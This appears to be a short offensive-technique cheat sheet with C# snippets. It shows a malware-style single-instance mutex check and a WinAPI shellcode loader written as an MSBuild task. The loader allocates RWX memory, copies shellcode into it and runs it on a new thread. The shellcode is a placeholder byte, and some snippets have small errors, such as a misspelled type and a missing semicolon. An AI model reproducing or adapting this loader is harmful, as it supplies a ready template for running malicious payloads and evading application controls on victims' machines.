# Execute Only Once

## Scripting

```cs
public static bool CreateMutex(ref Mutext mutex) {
    bool result = false;
    mutex = new Mutex(false, Sinalopolis.MUTEX, ref result);
    return result;
}
```

```cs
public static void CreateMutex(string condition) {
    bool flag;
	new Mutex(true, condition, ref flag)
	if (!flag) {
		Environment.Exit(5);
	}
}
```

## WinAPI

```cs
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class Program {
    // Constants for memory allocation and page protection
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32")]
    private static extern uint VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, uint lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public override bool Execute() {
        byte[] shellcode = new byte[] { 0x00 };

        uint funcAddr = VirtualAlloc(0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (funcAddr == 0) {
            Log.LogError("Memory allocation failed.");
            return false;
        }

        // Copy shellcode to allocated memory
        Marshal.Copy(shellcode, 0, (IntPtr)funcAddr, shellcode.Length);

        // Create a new thread to execute the shellcode
        uint threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        IntPtr hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

        if (hThread == IntPtr.Zero) {
            Log.LogError("Thread creation failed.");
            return false;
        }

        WaitForSingleObject(hThread, 0xFFFFFFFF);

        Log.LogMessage("Shellcode executed successfully.");
        return true;
    }
}
```